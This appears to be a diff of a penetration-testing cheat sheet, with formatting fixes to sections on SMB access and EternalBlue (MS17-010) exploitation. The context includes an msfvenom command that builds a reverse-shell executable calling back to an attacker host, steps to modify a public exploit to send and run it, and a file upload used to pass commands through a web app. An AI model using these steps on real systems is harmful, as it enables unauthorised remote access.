@@ -68,7 +68,7 @@ Hit Return 2x
 
 Logging into SMB Share
 
-<code>smbclient //[IP]/[SHARE] 
+<code>smbclient //[IP]/[SHARE]</code>
 
 Downloading all files from a directory
 
@@ -164,7 +164,6 @@ Store in a file on local host, navigate to it via the web app and pass commands 
 
 <code>>put [FILE]</code>
 
-
 ## SMB Exploitation
 
 ### Eternal Blue (MS17-010) 
@@ -176,7 +175,6 @@ Use exploit found [here](https://github.com/worawit/MS17-010)
 <code>msfvenom -p windows/shell_reverse_tcp LHOST=[LOCAL_IP] LPORT=[PORT] -f exe -o shell.exe</code>
 
 Change the <code>USERNAME = ''</code> line to <code>USERNAME = '//'</code>
-
 
 Uncomment the <code>smb_send_file(...)</code> and the <code>service_exe(...)</code>
 
